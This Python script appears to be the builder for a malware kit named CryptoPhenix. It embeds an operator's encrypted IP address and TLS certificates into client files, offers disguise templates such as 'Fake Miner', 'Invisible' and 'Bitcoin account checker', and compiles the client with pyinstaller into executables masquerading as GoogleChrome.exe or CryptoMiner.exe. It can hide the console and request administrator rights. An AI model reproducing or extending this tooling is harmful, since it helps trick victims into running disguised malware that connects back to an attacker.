import base64
import os
import subprocess
import time
from client.CryptoPhenix import init_crypt_file
import colorama
from colorama import Fore
colorama.init()

BLUE = Fore.BLUE
YELLOW = Fore.LIGHTYELLOW_EX
RED = Fore.RED
GREEN = Fore.GREEN
RESET = Fore.RESET
template = False


def clear():
    if os.name == "posix":
        os.system("clear")
    else:
        os.system("cls")


def read_file(file):
    with open(file, "r") as file:
        file = file.readlines()
    return file


def read_pyfile(file):
    with open(file, "rb") as file:
        file = file.readlines()
    return file


def write_pyfile(file, line_content):
    with open(file, "wb") as file:
        file.writelines(line_content)


def write_file(file, line_content):
    with open(file, "w") as file:
        file.writelines(line_content)


def menu_options():
    print(BLUE + "\n[*] " + RESET + "Select an option")
    print(BLUE + "\n\t1. " + RESET + "Select Template (Plantilla)")
    print(BLUE + "\n\t2. " + RESET + "Create & import certs")
    print(BLUE + "\n\t3. " + RESET + "Prepare & write IP address")
    print(BLUE + "\n\t4. " + RESET + "Compile all")
    print(BLUE + "\n\t5. " + RESET + "Start server")

    if template:
        print(RESET + "\nSelected Templtate" + YELLOW + " [>] {}".format(template))


def create_certs():
    # Ejecutamos el script CREATE_CERTS.py
    if os.name == "posix":
        os.system("python3 create_certs.py")
    else:
        os.system("create_certs.py")
    time.sleep(0.5)

    # Encodeamos certificado
    with open("cert.pem", "rb") as cert:
        cert = cert.read()
    cert = base64.b64encode(cert)

    # Encodeamos clave de certificado
    with open("key.pem", "rb") as key:
        key = key.read()
    key = base64.b64encode(key)

    return cert, key


def import_certs(file, cert, key):
    # Leemos el contenido del certs.py
    content = read_file(file)

    # Modificamos línea 12
    content[11] = "    return {}\n".format(cert)

    # Modificamos línea 16
    content[15] = "    return {}\n".format(key)

    # Escribimos en el archivo linea 11
    write_file(file, content)


def init_certs():
    # Certificado y clave encodeados (base64)
    print(YELLOW + "\n\t[+] " + RESET + "Creating Certs...")
    cert, key = create_certs()

    # Client cert
    print(YELLOW + "\t[+] " + RESET + "Importing certs to client...")
    file = "./client/certs.py"
    import_certs(file, cert, key)
    time.sleep(0.2)

    # Server cert
    print(YELLOW + "\t[+] " + RESET + "Importing certs to server...")
    file = "./server/certs.py"
    import_certs(file, cert, key)
    print(Fore.LIGHTGREEN_EX + "[*] " + RESET + "DONE" + YELLOW + "!" + RESET)
    time.sleep(0.3)


def crypt_ip():
    # Seleccionamos IP
    ip = input("\n Enter IP " + BLUE + "[!>] " + RESET + "")

    # Creamos archivo para encriptar
    with open("temp.txt", "w") as test:
        test.write(ip)

    # Encriptamos IP
    init_crypt_file("temp.txt", "")

    # Leemos ip encriptada
    with open("temp.txt", "rb") as f:
        content = f.read()

    # Eliminamos archivo temporal
    os.remove("temp.txt")
    return content


def init_ip_process(file_template, line):
    # Variables necesarias
    file1 = "./client/find_interests.py"
    file2 = "./client/get_points.py"
    ip = crypt_ip()
    message = "    unkown = {}\n".format(ip).encode()

    # Modify template
    template_content = read_pyfile(file_template)
    template_content[line] = message
    write_pyfile(file_template, template_content)

    # Modify find_interest
    find_content = read_pyfile(file1)
    find_content[29] = message
    write_pyfile(file1, find_content)

    # Modify get_points
    points_content = read_pyfile(file2)
    points_content[16] = message
    write_pyfile(file2, points_content)


def select_template():
    global template
    clear()
    print(GREEN + "\n[*] " + RESET + "Template Selector")
    print(GREEN + "\n\t[1] " + RESET + "Fake Miner")
    print(GREEN + "\n\t[2] " + RESET + "Invisible")
    print(GREEN + "\n\t[3] " + RESET + "Bitcoin account checker")
    template = False

    while not template:
        template = input(RESET + "\n Select " + YELLOW + "[!>] " + RESET + "")

        if template not in ["1", "2", "3"]:
            template = None

        elif template == "1":
            template = "Fake Miner"
            file_template = "./client/main.py"
            line = 52

        elif template == "2":
            template = "Invisible"
            file_template = "./client/main_inv.py"
            line = 38

        elif template == "3":
            template = "Bitcoin checker"
            file_template = "./client/main_checker.py"
            line = 64

    return file_template, line


def compileall(file_template):
    admin = None
    while not admin:
        admin = input(BLUE + "\n[!] " + YELLOW + "Do you want to run as admintrator? [ (S) Default / n ] > " + RESET)

        # Ejecutar .exe con privilegios de administrador
        if admin == "" or admin.lower() == "s":
            print(YELLOW + "\n[!>] " + RESET + "Compiling...")
            time.sleep(0.1)
            if file_template == "./client/main.py":
                a = subprocess.Popen(
                    "pyinstaller --onefile --clean -n CryptoMiner.exe --uac-admin --icon=./client/icons/minericon.ico ./client/main.py  ",
                    shell=True)
                a.wait()
            elif file_template == "./client/main_inv.py":
                a = subprocess.Popen(
                    "pyinstaller --noconsole --onefile --clean -n GoogleChrome.exe --uac-admin --icon=./client/icons/GoogleChrome.ico ./client/main_inv.py",
                    shell=True)
                a.wait()

            elif file_template == "./client/main_checker.py":
                a = subprocess.Popen(
                    "pyinstaller --onefile --clean -n Bit-Checker.exe --uac-admin --icon=./client/icons/bit-checker.ico ./client/main_checker.py",
                    shell=True)
                a.wait()
            break

        # NO ejecutar .exe con privilegios de administrador
        elif admin.lower() == "n":
            print(YELLOW + "\n[!>] " + RESET + "Compiling...")
            time.sleep(0.1)
            if file_template == "./client/main.py":
                a = subprocess.Popen(
                    "pyinstaller --onefile --clean -n CryptoMiner.exe --icon=./client/icons/minericon.ico ./client/main.py  ",
                    shell=True)
                a.wait()

            elif file_template == "./client/main_inv.py":
                a = subprocess.Popen(
                    "pyinstaller --noconsole --onefile --clean -n GoogleChrome.exe --icon=./client/icons/GoogleChrome.ico ./client/main_inv.py",
                    shell=True)
                a.wait()

            elif file_template == "./client/main_checker.py":
                a = subprocess.Popen(
                    "pyinstaller --onefile --clean -n Bit-Checker.exe --icon=./client/icons/bit-checker.ico ./client/main_checker.py",
                    shell=True)
                a.wait()
            break

        else:
            admin = None


def main():
    while True:
        clear()
        menu_options()
        option = input(RESET + "\n Select " + BLUE + "[!>] " + RESET + "")

        if option == "q":
            exit()

        elif option == "1":
            file_template, line = select_template()

        elif option == "2":
            init_certs()

        elif option == "3":
            try:
                init_ip_process(file_template, line)
            except UnboundLocalError:
                print(RED + "\n[!] " + YELLOW + "Select a template first")
                file_template, line = select_template()
                init_ip_process(file_template, line)

        elif option == "4":
            try:
                compileall(file_template)
            except UnboundLocalError:
                print(RED + "\n[!] " + YELLOW + "Select a template first")
                file_template, line = select_template()
                compileall(file_template)

        elif option == "5":
            os.system(".\server\server.py")

        else:
            pass


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(RED + "\n\t[!] Saliendo...\n" + RESET)
        exit()

    except EOFError:
        print(RED + "\n\t[!] Saliendo...\n" + RESET)
        exit()
